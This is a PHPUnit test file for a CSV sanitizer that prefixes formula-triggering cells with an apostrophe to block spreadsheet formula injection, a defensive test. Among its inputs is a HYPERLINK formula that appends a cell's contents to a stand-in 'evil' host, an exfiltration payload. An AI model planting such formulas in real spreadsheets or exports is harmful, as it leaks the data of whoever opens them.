<?php

declare(strict_types=1);

namespace Tests\Unit\Support;

use App\Support\CsvSanitizer;
use PHPUnit\Framework\TestCase;

class CsvSanitizerTest extends TestCase
{
    /**
     * @return list<array{0: string}>
     */
    public static function formulaTriggers(): array
    {
        return [
            ['=HYPERLINK("http://evil/?"&A1,"x")'],
            ['+1+1'],
            ['-2+3'],
            ['@SUM(A1:A2)'],
            ["\tTabbed"],
            ["\rCarriage"],
        ];
    }

    /**
     * @dataProvider formulaTriggers
     */
    public function test_formula_cells_are_prefixed(string $value): void
    {
        $out = CsvSanitizer::cell($value);
        $this->assertSame("'".$value, $out);
    }

    public function test_safe_cells_are_unchanged(): void
    {
        $this->assertSame('Rapat Tim', CsvSanitizer::cell('Rapat Tim'));
        $this->assertSame('budi@bpjs-kesehatan.go.id', CsvSanitizer::cell('budi@bpjs-kesehatan.go.id'));
        $this->assertSame('', CsvSanitizer::cell(''));
        $this->assertSame('123', CsvSanitizer::cell('123'));
    }

    public function test_row_maps_each_cell(): void
    {
        $this->assertSame(["'=evil", 'ok'], CsvSanitizer::row(['=evil', 'ok']));
    }
}
